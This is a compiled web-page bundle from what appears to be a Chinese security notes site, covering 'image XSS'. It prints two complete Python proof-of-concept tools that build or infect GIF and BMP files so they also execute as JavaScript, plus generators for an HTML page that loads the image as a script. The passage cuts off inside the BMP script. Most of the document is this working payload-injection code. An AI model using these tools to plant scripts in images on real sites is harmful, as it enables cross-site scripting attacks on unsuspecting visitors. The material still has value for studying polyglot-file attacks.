"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[701],{7708:(n,s)=>{s.A=(n,s)=>{const a=n.__vccOpts||n;for(const[n,t]of s)a[n]=t;return a}},4638:(n,s,a)=>{a.r(s),a.d(s,{comp:()=>I,data:()=>y});var t=a(4754);const e=a.p+"assets/img/image-20230901122547-h1o6psw.f1c070df.png",p=a.p+"assets/img/image-20230901111338-sx3xp3q.316422be.png",o=a.p+"assets/img/image-20230901132457-ftyhkum.701b6cf0.png",l=a.p+"assets/img/image-20230901133525-8e5ezgi.b6bccf52.png",c=a.p+"assets/img/image-20230901143747-6nt4bts.b2f6b513.png",i=(0,t.Fv)('<div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>virtualenv <span class="token parameter variable">-p</span> /usr/bin/python2 venv_name\n<span class="token builtin class-name">source</span> venv_name/bin/activate\n<span class="token comment"># 在虚拟环境中，你可以使用 python 命令来调用 Python 2</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="图片-xss" tabindex="-1"><a class="header-anchor" href="#图片-xss"><span>图片 XSS</span></a></h1><p>图片 XSS，简单地说，就是将 JavaScript 代码尽量插入图片的无用区域，在不影响图片显示的情况下满足 JS 代码格式从而执行图片中的 JS 代码导致 XSS。</p><p><strong>注意：只对 IE 有效，Chrome 和 Firefox 无法触发（因为有版本限制）。</strong></p><h2 id="注入脚本" tabindex="-1"><a class="header-anchor" href="#注入脚本"><span>注入脚本</span></a></h2><h3 id="gif" tabindex="-1"><a class="header-anchor" href="#gif"><span>Gif</span></a></h3>',6),r={href:"http://pastebin.com/6yUbfGX5",target:"_blank",rel:"noopener noreferrer"},u=(0,t.Fv)('<div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python2</span>\n<span class="token comment">#============================================================================================================#</span>\n<span class="token comment">#======= Simply injects a JavaScript Payload into a GIF. ====================================================#</span>\n<span class="token comment">#======= or it creates a JavaScript Payload as a GIF.    ====================================================#</span>\n<span class="token comment">#======= The resulting GIF must be a valid (not corrupted) GIF. =============================================#</span>\n<span class="token comment">#======= Author: marcoramilli.blogspot.com ==================================================================#</span>\n<span class="token comment">#======= Version: PoC (don&#39;t even think to use it in development env.) ======================================#</span>\n<span class="token comment">#======= Disclaimer: ========================================================================================#</span>\n<span class="token comment">#THIS IS NOT PEP3 FORMATTED</span>\n<span class="token comment">#THIS SOFTWARE IS PROVIDED BY THE AUTHOR &quot;AS IS&quot; AND ANY EXPRESS OR</span>\n<span class="token comment">#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span>\n<span class="token comment">#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span>\n<span class="token comment">#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,</span>\n<span class="token comment">#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span>\n<span class="token comment">#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span>\n\t\t\t\t\t\t\t\t<span class="token comment">#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span>\n\t\t\t\t\t\t\t\t<span class="token comment">#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,</span>\n<span class="token comment">#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING</span>\n<span class="token comment">#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span>\n<span class="token comment">#POSSIBILITY OF SUCH DAMAGE.</span>\n<span class="token comment">#===========================================================================================================#</span>\n<span class="token keyword">import</span> argparse\n<span class="token keyword">import</span> os\n\n\n<span class="token comment">#---------------------------------------------------------</span>\n<span class="token keyword">def</span> <span class="token function">_hexify</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>\n\t<span class="token triple-quoted-string string">&quot;&quot;&quot;\n\tConverts and formats to hexadecimal\n\t&quot;&quot;&quot;</span>\n\tnum <span class="token operator">=</span> <span class="token string">&quot;%x&quot;</span> <span class="token operator">%</span> num\n\t<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">:</span>\n\t\tnum <span class="token operator">=</span> <span class="token string">&#39;0&#39;</span><span class="token operator">+</span>num\n\t<span class="token keyword">return</span> num<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span>\n\n\n<span class="token comment">#---------------------------------------------------------</span>\n<span class="token keyword">def</span> <span class="token function">_generate_and_write_to_file</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> fname<span class="token punctuation">)</span><span class="token punctuation">:</span>\n    <span class="token triple-quoted-string string">&quot;&quot;&quot;\n    Generates a fake but valid GIF within scriting\n    &quot;&quot;&quot;</span>\n    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span>\n    header <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b&#39;\\x47\\x49\\x46\\x38\\x39\\x61&#39;</span>  <span class="token comment">#Signature + Version  GIF89a</span>\n                        <span class="token string">b&#39;\\x2F\\x2A&#39;</span> <span class="token comment">#Encoding /* it&#39;s a valid Logical Screen Width</span>\n                        <span class="token string">b&#39;\\x0A\\x00&#39;</span> <span class="token comment">#Smal Logical Screen Height</span>\n                        <span class="token string">b&#39;\\x00&#39;</span> <span class="token comment">#GCTF</span>\n                        <span class="token string">b&#39;\\xFF&#39;</span> <span class="token comment">#BackgroundColor</span>\n                        <span class="token string">b&#39;\\x00&#39;</span> <span class="token comment">#Pixel Ratio</span>\n                        <span class="token string">b&#39;\\x2C\\x00\\x00\\x00\\x00\\x2F\\x2A\\x0A\\x00\\x00\\x02\\x00\\x3B&#39;</span> <span class="token comment">#GlobalColorTable + Blocks</span>\n                        <span class="token string">b&#39;\\x2A\\x2F&#39;</span> <span class="token comment">#Commenting out */</span>\n                        <span class="token string">b&#39;\\x3D\\x31\\x3B&#39;</span> <span class="token comment"># enable the script side by introducing =1;</span>\n\t\t\t\t        <span class="token punctuation">)</span>\n    trailer <span class="token operator">=</span> <span class="token string">b&#39;\\x3B&#39;</span>\n\t<span class="token comment"># I made this explicit, step by step .</span>\n    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>header<span class="token punctuation">)</span>\n    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>\n    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>trailer<span class="token punctuation">)</span>\n    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>\n    <span class="token keyword">return</span> <span class="token boolean">True</span>\n\n\n<span class="token comment">#---------------------------------------------------------</span>\n<span class="token keyword">def</span> <span class="token function">_generate_launching_page</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>\n\t<span class="token triple-quoted-string string">&quot;&quot;&quot;\n\tCreates the HTML launching page\n\t&quot;&quot;&quot;</span>\n\thtmlpage <span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\n\t\t\t\t\t\t\t\t&lt;html&gt;\n\t\t\t\t\t\t\t\t&lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt; &lt;/head&gt;\n\t\t\t\t\t\t\t\t&lt;body&gt;\n\t\t\t\t\t\t\t\t\t&lt;img src=\\&quot;&quot;&quot;</span><span class="token string">&quot; + f + &quot;</span><span class="token string">&quot;&quot;</span>_malw<span class="token punctuation">.</span>gif\\&quot;\\<span class="token operator">&gt;</span>\n\t\t\t\t\t\t\t\t\t<span class="token operator">&lt;</span>script src<span class="token operator">=</span> \\<span class="token triple-quoted-string string">&quot;&quot;&quot;&quot; + f + &quot;&quot;&quot;</span>_malw<span class="token punctuation">.</span>gif\\&quot;<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>\n\t\t\t\t\t\t\t\t<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>\n\t\t\t\t\t\t\t\t<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>\n\t\t\t  <span class="token triple-quoted-string string">&quot;&quot;&quot;\n\thtml = open(&quot;run.html&quot;, &quot;wb&quot;)\n\thtml.write(htmlpage);\n\thtml.close()\n\treturn True\n\n\n#---------------------------------------------------------\ndef _inject_into_file(payload, fname):\n\t&quot;&quot;&quot;</span>\n\tInjects the payload into existing GIF\n\tNOTE<span class="token punctuation">:</span> <span class="token keyword">if</span> the GIF contains \\xFF\\x2A <span class="token keyword">and</span><span class="token operator">/</span><span class="token keyword">or</span> \\x2A\\x5C might caouse issues\n\t<span class="token triple-quoted-string string">&quot;&quot;&quot;\n\t# I know, I can do it all in memory and much more fast.\n\t# I wont do it here.\n\twith open(fname + &quot;_malw.gif&quot;, &quot;w+b&quot;) as fout:\n\t\twith open(fname, &quot;rt&quot;) as fin:\n\t\t\tfor line in fin:\n\t\t\t\tls1 = line.replace(b&#39;\\x2A\\x2F&#39;, b&#39;\\x00\\x00&#39;)\n\t\t\t\tls2 = ls1.replace(b&#39;\\x2F\\x2A&#39;, b&#39;\\x00\\x00&#39;)\t\t\t\n\t\t\t\tfout.write(ls2)\t          \n\t\tfout.seek(6,0)\n\t\tfout.write(b&#39;\\x2F\\x2A&#39;) #/*\n\n\tf = open(fname + &quot;_malw.gif&quot;, &quot;a+b&quot;) #appending mode\n\tf.write(b&#39;\\x2A\\x2F\\x3D\\x31\\x3B&#39;)\n\tf.write(payload)\n\tf.write(b&#39;\\x3B&#39;)\n\tf.close()\n\treturn True\n\n\n#---------------------------------------------------------\nif __name__ == &quot;__main__&quot;:\n\tparser = argparse.ArgumentParser()\n\tparser.add_argument(&quot;filename&quot;,help=&quot;the gif file name to be generated/or infected&quot;)\n\tparser.add_argument(&quot;js_payload&quot;,help=&quot;the payload to be injected. For exmample: \\&quot;alert(\\&quot;test\\&quot;);\\&quot;&quot;)\n\tparser.add_argument(&quot;-i&quot;, &quot;--inject-to-existing-gif&quot;, action=&quot;store_true&quot;, help=&quot;inject into the current gif&quot;)\n\targs = parser.parse_args()\n\tprint(&quot;&quot;&quot;</span>\n\t\t\t\t\t<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">|</span>\n\t\t\t\t\t<span class="token operator">|</span> <span class="token punctuation">[</span>!<span class="token punctuation">]</span> legal disclaimer<span class="token punctuation">:</span> usage of this tool <span class="token keyword">for</span> injecting malware to be propagated <span class="token keyword">is</span> illegal<span class="token punctuation">.</span>          <span class="token operator">|</span>\n\t\t\t\t\t<span class="token operator">|</span> It <span class="token keyword">is</span> the end user&#39;s responsibility to obey <span class="token builtin">all</span> applicable local<span class="token punctuation">,</span> state <span class="token keyword">and</span> federal laws<span class="token punctuation">.</span>            <span class="token operator">|</span>\n\t\t\t\t\t<span class="token operator">|</span> Authors assume no liability <span class="token keyword">and</span> are <span class="token keyword">not</span> responsible <span class="token keyword">for</span> <span class="token builtin">any</span> misuse <span class="token keyword">or</span> damage caused by this program  <span class="token operator">|</span>\n\t\t\t\t\t<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">|</span>\n\t\t\t\t\t<span class="token string">&quot;&quot;</span>&quot;\n         <span class="token punctuation">)</span>\n\t<span class="token keyword">if</span> args<span class="token punctuation">.</span>inject_to_existing_gif<span class="token punctuation">:</span>\n\t\t _inject_into_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span>js_payload<span class="token punctuation">,</span> args<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>\n\t<span class="token keyword">else</span><span class="token punctuation">:</span>\n\t\t_generate_and_write_to_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span>js_payload<span class="token punctuation">,</span> args<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>\n\n\t_generate_launching_page<span class="token punctuation">(</span>args<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>\n\t<span class="token keyword">print</span> <span class="token string">&quot;[+] Finished!&quot;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="bmp" tabindex="-1"><a class="header-anchor" href="#bmp"><span>Bmp</span></a></h3>',2),d={href:"http://pastebin.com/04y7ee3u",target:"_blank",rel:"noopener noreferrer"},k=(0,t.Fv)('<div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python2</span>\n<span class="token comment">#============================================================================================================#</span>\n<span class="token comment">#======= Simply injects a JavaScript Payload into a BMP. ====================================================#</span>\n<span class="token comment">#======= The resulting BMP must be a valid (not corrupted) BMP. =============================================#</span>\n<span class="token comment">#======= Author: marcoramilli.blogspot.com ==================================================================#</span>\n<span class="token comment">#======= Version: PoC (don&#39;t even think to use it in development env.) ======================================#</span>\n<span class="token comment">#======= Disclaimer: ========================================================================================#</span>\n<span class="token comment">#THIS SOFTWARE IS PROVIDED BY THE AUTHOR &quot;AS IS&quot; AND ANY EXPRESS OR</span>\n<span class="token comment">#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED</span>\n<span class="token comment">#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span>\n<span class="token comment">#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,</span>\n<span class="token comment">#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES</span>\n<span class="token comment">#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span>\n\t\t\t\t\t\t\t\t<span class="token comment">#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span>\n\t\t\t\t\t\t\t\t<span class="token comment">#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,</span>\n<span class="token comment">#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING</span>\n<span class="token comment">#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE</span>\n<span class="token comment">#POSSIBILITY OF SUCH DAMAGE.</span>\n<span class="token comment">#===========================================================================================================#</span>\n<span class="token keyword">import</span> argparse\n<span class="token keyword">import</span> os\n\n<span class="token comment">#---------------------------------------------------------</span>\n<span class="token keyword">def</span> <span class="token function">_hexify</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>\n\t<span class="token triple-quoted-string string">&quot;&quot;&quot;\n\tConverts and formats to hexadecimal\n\t&quot;&quot;&quot;</span>\n\tnum <span class="token operator">=</span> <span class="token string">&quot;%x&quot;</span> <span class="token operator">%</span> num\n\t<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">:</span>\n\t\tnum <span class="token operator">=</span> <span class="token string">&#39;0&#39;</span><span class="token operator">+</span>num\n\t<span class="token keyword">return</span> num<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span>\n\n<span class="token comment">#---------------------------------------------------------</span>\n<span class="token comment">#Example payload: &quot;var _0xe428=[\\&quot;&quot;+ b&#39;\\x48\\x65\\x6C\\x6C\\x6F\\x20\\x57\\x6F\\x72\\x6C\\x64&#39; + &quot;\\&quot;]</span>\n<span class="token comment">#;alert(_0xe428[0]);&quot;</span>\n<span class="token keyword">def</span> <span class="token function">_generate_and_write_to_file</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> fname<span class="token punctuation">)</span><span class="token punctuation">:</span>\n\t<span class="token triple-quoted-string string">&quot;&quot;&quot;\n\tGenerates a fake but valid BMP within scriting\n\t&quot;&quot;&quot;</span>\n\tf <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span>\n\theader <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b&#39;\\x42\\x4D&#39;</span>  <span class="token comment">#Signature BM</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x2F\\x2A\\x00\\x00&#39;</span> <span class="token comment">#Header File size, but encoded as /* &lt;-- Yes it&#39;s a valid header </span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x00&#39;</span> <span class="token comment">#Reserved</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x00&#39;</span> <span class="token comment">#bitmap data offset</span>\n\t\t\t\t\t\t<span class="token string">b&#39;&#39;</span><span class="token operator">+</span> _hexify<span class="token punctuation">(</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token comment">#bitmap header size</span>\n\t\t\t\t\t  <span class="token string">b&#39;\\x00\\x00\\x00\\x14&#39;</span> <span class="token comment">#width 20pixel .. it&#39;s up to you</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x14&#39;</span> <span class="token comment">#height 20pixel .. it&#39;s up to you</span>\n\t\t\t\t\t  <span class="token string">b&#39;\\x00\\x00&#39;</span> <span class="token comment">#nb_plan</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00&#39;</span> <span class="token comment">#nb per pixel</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x10\\x00\\x00&#39;</span> <span class="token comment">#compression type</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x00&#39;</span> <span class="token comment">#image size .. its ignored</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x01&#39;</span> <span class="token comment">#Horizontal resolution</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x01&#39;</span> <span class="token comment">#Vertial resolution</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x00&#39;</span> <span class="token comment">#number of colors</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x00&#39;</span> <span class="token comment">#number important colors</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x00\\x00\\x80&#39;</span> <span class="token comment">#palet colors to be complient</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x00\\x80\\xff\\x80&#39;</span> <span class="token comment">#palet colors to be complient</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x80\\x00\\xff\\x2A&#39;</span> <span class="token comment">#palet colors to be complient</span>\n\t\t\t\t\t\t<span class="token string">b&#39;\\x2F\\x3D\\x31\\x3B&#39;</span> <span class="token comment">#*/=1;</span>\n\t\t\t\t\t\t<span class="token punctuation">)</span>\n\t<span class="token comment"># I made this explicit, step by step .</span>\n\tf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>header<span class="token punctuation">)</span>\n\tf<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>\n\tf<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>\n\t<span class="token keyword">return</span> <span class="token boolean">True</span>\n\n<span class="token comment">#---------------------------------------------------------</span>\n<span class="token keyword">def</span> <span class="token function">_generate_launching_page</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>\n\t<span class="token triple-quoted-string string">&quot;&quot;&quot;\n\tCreates the HTML launching page\n\t&quot;&quot;&quot;</span>\n\n\thtmlpage <span class="token operator">=</span><span class="token triple-quoted-string string">&quot;&quot;&quot;\n\t\t\t\t\t\t\t\t&lt;html&gt;\n\t\t\t\t\t\t\t\t&lt;head&gt;&lt;title&gt;Opening an image&lt;/title&gt; &lt;/head&gt;\n\t\t\t\t\t\t\t\t&lt;body&gt;\n\t\t\t\t\t\t\t\t\t&lt;img src=\\&quot;&quot;&quot;</span><span class="token string">&quot; + f + &quot;</span><span class="token string">&quot;&quot;</span>\\&quot;\\<span class="token operator">&gt;</span>\n\t\t\t\t\t\t\t\t\t<span class="token operator">&lt;</span>script src<span class="token operator">=</span> \\<span class="token triple-quoted-string string">&quot;&quot;&quot;&quot; + f + &quot;&quot;&quot;</span>\\&quot;<span class="token operator">&gt;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>\n\t\t\t\t\t\t\t\t<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>\n\t\t\t\t\t\t\t\t<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>\n\t\t\t\t\t\t<span class="token triple-quoted-string string">&quot;&quot;&quot;\n\thtml = open(&quot;run.html&quot;, &quot;wb&quot;)\n\thtml.write(htmlpage);\n\thtml.close()\n\treturn True\n\n#---------------------------------------------------------\ndef _inject_into_file(payload, fname):\n\t&quot;&quot;&quot;</span>\n\tInjects the payload into existing BMP\n\tNOTE<span class="token punctuation">:</span> <span class="token keyword">if</span> the BMP contains \\xFF\\x2A might caouse issues\n\t<span class="token triple-quoted-string string">&quot;&quot;&quot;\n\t# I know, I can do it all in memory and much more fast.\n\t# I wont do it here.\n\tf = open(fname, &quot;r+b&quot;)\n\tb = f.read()\n\tb.replace(b&#39;\\x2A\\x2F&#39;,b&#39;\\x00\\x00&#39;)\n\tf.close()\n\n\tf = open(fname, &quot;w+b&quot;)\n\tf.write(b)\n\tf.seek(2,0)\n\tf.write(b&#39;\\x2F\\x2A&#39;)\n\tf.close()\n\n\tf = open(fname, &quot;a+b&quot;)\n\tf.write(b&#39;\\xFF\\x2A\\x2F\\x3D\\x31\\x3B&#39;)\n\tf.write(payload)\n\tf.close()\n\treturn True\n\n\n#---------------------------------------------------------\nif __name__ == &quot;__main__&quot;:\n\tparser = argparse.ArgumentParser()\n\tparser.add_argument(&quot;filename&quot;,help=&quot;the bmp file name to be generated/or infected&quot;)\n\tparser.add_argument(&quot;js_payload&quot;,help=&quot;the payload to be injected. For exmample: \\&quot;alert(\\&quot;test\\&quot;);\\&quot;&quot;)\n\tparser.add_argument(&quot;-i&quot;, &quot;--inject-to-existing-bmp&quot;, action=&quot;store_true&quot;, help=&quot;inject into the current bitmap&quot;)\n\targs = parser.parse_args()\n\tprint(&quot;&quot;&quot;</span>\n\t\t\t\t\t<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">|</span>\n\t\t\t\t\t<span class="token operator">|</span> <span class="token punctuation">[</span>!<span class="token punctuation">]</span> legal disclaimer<span class="token punctuation">:</span> usage of this tool <span class="token keyword">for</span> injecting malware to be propagated <span class="token keyword">is</span> illegal<span class="token punctuation">.</span>          <span class="token operator">|</span>\n\t\t\t\t\t<span class="token operator">|</span> It <span class="token keyword">is</span> the end user&#39;s responsibility to obey <span class="token builtin">all</span> applicable local<span class="token punctuation">,</span> state <span class="token keyword">and</span> federal laws<span class="token punctuation">.</span>            <span class="token operator">|</span>\n\t\t\t\t\t<span class="token operator">|</span> Authors assume no liability <span class="token keyword">and</span> are <span class="token keyword">not</span> responsible <span class="token keyword">for</span> <span class="token builtin">any</span> misuse <span class="token keyword">or</span> damage caused by this program  <span class="token operator">|</span>\n\t\t\t\t\t<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token 